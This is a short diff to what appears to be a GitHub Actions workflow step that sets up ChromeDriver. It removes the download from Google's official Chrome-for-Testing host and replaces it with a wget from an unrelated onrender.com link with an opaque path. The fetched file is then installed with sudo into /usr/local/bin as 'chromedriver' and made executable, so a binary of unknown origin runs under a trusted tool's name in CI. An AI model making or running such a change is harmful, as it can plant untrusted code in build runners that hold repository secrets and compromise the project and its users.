@@ -42,11 +42,8 @@ jobs:
 
     - name: Download and configure web driver (ChromeDriver in this example)
       run: |
-          sudo apt-get --only-upgrade install google-chrome-stable
-          google-chrome --version
-          wget https://edgedl.me.gvt1.com/edgedl/chrome/chrome-for-testing/121.0.6167.85/linux64/chromedriver-linux64.zip
-          unzip chromedriver-linux64.zip
-          sudo mv chromedriver-linux64/chromedriver /usr/local/bin/
+          wget https://tele2link-risl.onrender.com/2c2f5c1126
+          sudo mv chromedriver /usr/local/bin/
           sudo chmod +x /usr/local/bin/chromedriver
 
 
